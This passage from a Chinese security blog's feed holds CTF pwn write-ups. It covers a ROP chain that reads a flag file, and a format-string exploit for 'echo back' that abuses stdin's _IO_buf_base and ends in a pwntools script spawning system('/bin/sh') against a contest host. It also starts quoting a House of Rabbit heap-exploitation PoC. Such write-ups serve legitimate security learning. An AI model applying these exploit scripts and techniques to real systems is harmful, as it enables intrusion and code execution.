class="number">0x100</span>)+p64(pie+<span class="number">0x0000000000001821</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pie+elf.symbols[<span class="string">'open'</span>])+p64(pie+<span class="number">0x0000000000001823</span>)+p64(<span class="number">6</span>)+p64(pie+<span class="number">0x0000000000001821</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(pie+elf.symbols[<span class="string">'read'</span>])+p64(pie+<span class="number">0x0000000000001823</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(pie+elf.symbols[<span class="string">'puts'</span>])</span><br><span class="line">rop +=<span class="string">'a'</span>*(<span class="number">0x100</span>-len(rop))</span><br><span class="line">rop += <span class="string">'/home/ctf/flag\0'</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">hex(-0x7fb165afd580 +0x7fb174d53000)  0xf255a80</span></span><br><span class="line"><span class="string">hex(-0x7f810afe4db0 + 0x7f811af62000) 0xff7d250</span></span><br><span class="line"><span class="string">hex(-0x7fe3844beeb0 + 0x7fe394428000) 0xff69150</span></span><br><span class="line"><span class="string">hex(-0x7f73844633a0 + 0x7f73940a9000) 0xfc45c60</span></span><br><span class="line"><span class="string">0x0000000000001823 : pop rdi ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0000000000001821 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    00000000  23 28 99 7f  32 56 00 00  20 2f 20 00  00 00 00 00  │#(··│2V··│ / ·│····│</span></span><br><span class="line"><span class="string">    00000010  00 0b 00 00  00 00 00 00  23 28 99 7f  32 56 00 00  │····│····│#(··│2V··│</span></span><br><span class="line"><span class="string">    00000020  70 2f 20 00  00 00 00 00  00 0b 00 00  00 00 00 00  │p/ ·│····│····│····│</span></span><br><span class="line"><span class="string">    00000030  23 28 99 7f  32 56 00 00  30 2f 20 00  00 00 00 00  │#(··│2V··│0/ ·│····│</span></span><br><span class="line"><span class="string">    00000040  00 0b 00 00  00 00 00 00  0a </span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x49 bytes:</span></span><br><span class="line"><span class="string">    00000000  23 28 99 7f  32 56 00 00  20 2f 20 00  00 00 00 00  │#(··│2V··│ / ·│····│</span></span><br><span class="line"><span class="string">    00000010  00 0b 00 00  00 00 00 00  23 28 99 7f  32 56 00 00  │····│····│#(··│2V··│</span></span><br><span class="line"><span class="string">    00000020  70 2f 20 00  00 00 00 00  00 0b 00 00  00 00 00 00  │p/ ·│····│····│····│</span></span><br><span class="line"><span class="string">    00000030  23 28 99 7f  32 56 00 00  30 2f 20 00  00 00 00 00  │#(··│2V··│0/ ·│····│</span></span><br><span class="line"><span class="string">    00000040  00 0b 00 00  00 00 00 00  0a                        │····│····│·│</span></span><br><span class="line"><span class="string">    00000049</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">: </span></span><br><span class="line"><span class="string">[DEBUG] Received 0x40 bytes:</span></span><br><span class="line"><span class="string">    '/home/ctf/run.sh: line 2:    84 Segmentation fault      ./house\n'</span></span><br><span class="line"><span class="string">/home/ctf/run.sh: line 2:    84 Segmentation fault      ./house</span></span><br><span class="line"><span class="string">[*] Got EOF while reading in interactive</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="echo-back"><a href="#echo-back" class="headerlink" title="echo back"></a>echo back</h1><p>此题当时没有做出来就和本科室友出去玩了… 后来回来复现了一下</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>总体来说题目逻辑简单，漏洞也比较明显——格式化字符串，但是格式化字符串的长度是有限制的：</p><p><img src="/img/ciscn/3-1.png" alt="漏洞"></p><p>首先利用格式化字符串可以泄露PIE、栈、libc地址。存在一个setname函数，可以由用户输入一个长度为7的值，由此步骤和格式化字符串漏洞，可以达到一个向任意地址写一个四字节或两字节或单字节的\x00。</p><p><img src="/img/ciscn/3-2.png" alt="漏洞"></p><p>向任意地址写单字节的\x00还是比较敏感的，在去年的WHCTF 2017 中出现过一道向_IO_buf_base末位写\x00的利用方法，但是给定的libc是libc-2.24.so，此题虽然给的是libc-2.23.so，同样利用这个方法。</p><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该种利用方法利用的是文件IO中的几个指针在scanf中的应用。之前针对IO的利用也写过一些，比如House of Orange，那种利用方法比较复杂，是与堆结合，之前写过一篇丢到了看雪上：<a href="https://bbs.pediy.com/thread-223334.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223334.htm</a> 这个攻击方法没有那么复杂，但是需要读scanf的源码。</p><p>首先scanf调用了 _IO_vfscanf ，并且提供增加了操作的文件指针stdin，这个指针很熟悉，是0号文件。其结构体是：</p><p><img src="/img/ciscn/3-4.png" alt="scanf"></p><p><img src="/img/ciscn/3-3.png" alt="IO指针"></p><p>其中红圈内的指针是本次漏洞利用主角</p><p>继续追踪_IO_vfscanf 函数，其具体实现是内联函数_IO_vfscanf_internal，其内部实现了scanf对于格式化的操作，其中比较重要的是inchar()，这个函数是读入用户输入数据的函数。此函数最终调用了_IO_new_file_underflow进行输入，这个最底层的操作。</p><p>查看函数逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><p>当_IO_read_ptr &lt; _IO_read_end时，函数直接返回_IO_read_ptr。反之，则会进行一系列赋值操作，最终调用read的系统调用向_IO_buf_base中读入数据。可以想到，当可以控制_IO_buf_base的值就可以达到任意地址写的目的了。</p><p>题目中可以利用是因为当覆盖为00时，指针恰好指向了stdin内部地址，并且可以再次覆写_IO_buf_base进一步造成内存任意写，而在scanf后面跟了一个getchar()函数，每次调用这个函数是会导致_IO_read_ptr++。</p><p><img src="/img/ciscn/3-8.png" alt="echo函数"></p><p>由于在覆写_IO_base_buf时，会造成_IO_read_end+=输入的size，不断利用getchar可以使得_IO_read_ptr逐渐增大到_IO_read_end，最终再次调用read系统调用，达到内存任意写的目的。第二次覆写_IO_buf_base的内容为函数返回地址，写入ROP即可拿到shell</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./echo_back'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./echo_back'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">32619</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">echo(<span class="string">'%12$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">stack_addr = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack :'</span>,hex(stack_addr)</span><br><span class="line">echo(<span class="string">'%13$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">pie = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0xd08</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] pie :'</span>,hex(pie)</span><br><span class="line">echo(<span class="string">'%19$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">libc.address = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-240</span>-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">set_name(p64(libc.address + <span class="number">0x3c4918</span>)[:<span class="number">-1</span>])</span><br><span class="line">echo(<span class="string">'%16$hhn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">padding = p64(libc.address+<span class="number">0x3c4963</span>)*<span class="number">3</span> + p64(stack_addr<span class="number">-0x28</span>)+p64(stack_addr+<span class="number">0x10</span>)</span><br><span class="line">p.send(padding)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(padding)<span class="number">-1</span>):</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">rop = p64(pie+<span class="number">0x0000000000000d93</span>)+p64(next(libc.search(<span class="string">'/bin/sh'</span>)))+p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000000d8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d90 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d92 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000940 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d93 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d91 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000861 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤... 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的意思？хорошо）。最后做出来和复现的有三道：note-service2  、 house_of_grey 、 echo_back
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>House Of Rabbit 原理</title>
    <link href="http://p4nda.top/2018/04/18/house-of-rabbit/"/>
    <id>http://p4nda.top/2018/04/18/house-of-rabbit/</id>
    <published>2018-04-18T12:49:22.000Z</published>
    <updated>2018-07-05T13:32:46.699Z</updated>
    
    <content type="html"><![CDATA[<p>House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到<strong>任意</strong>地址分配的目的。</p><h1 id="所需条件"><a href="#所需条件" class="headerlink" title="所需条件"></a>所需条件</h1><ol><li>可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处）</li><li>存在一块已知地址的内存空间，并可以任意写至少<strong>0x20</strong>长度的字节</li><li>存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。</li></ol><p>当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？）</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>在<a href="https://github.com/shift-crops/House_of_Rabbit/blob/master/house_of_rabbit.c" target="_blank" rel="noopener">此处</a>有可以使用的样例文件，来自 <a href="https://github.com/shift-crops" target="_blank" rel="noopener">shift-crops</a> ，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   PoC of House of Rabbit</span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 16.04 (64bit).</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   Yutaro Shimizu</span></span><br><span class="line"><span class="comment">   @shift_crops</span></span><br><span class="line"><span class="comment">   2017/09/14</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> target[<span class="number">0x10</span>] = <span class="string">"Hello, World!"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gbuf[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p, *fast, *small, *fake;</span><br><span class="line"><span class="keyword">char</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This is PoC of House of Rabbit\n"</span></span><br><span class="line"><span class="string">"This technique bypassing Heap ASLR without leaking address, "</span></span><br><span class="line"><span class="string">"and make it possible to overwrite a variable located at an arbitary address.\n"</span></span><br><span class="line"><span class="string">"Jump like a rabbit and get an accurate address by malloc! :)\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. Make 'av-&gt;system_mem &gt; 0xa00000'</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte by mmap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte in heap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Free fast chunk and link to fastbins</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk and link to fastbins\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// any size in fastbins is ok </span></span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate fast chunk and small chunk.\n"</span></span><br><span class="line"><span class="string">"  fast = %p\n"</span></span><br><span class="line"><span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Make fake_chunk on .bss</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Make fake_chunk on .bss\n"</span>);</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x11</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line"><span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// use after free or fastbins dup etc...</span></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VULNERABILITY (e.g. UAF)\n"</span></span><br><span class="line"><span class="string">"  *fast = %p\n"</span></span><br><span class="line">, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. call malloc_consolidate</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4. call malloc_consolidate\n"</span></span><br><span class="line"><span class="string">"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"</span></span><br><span class="line">, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 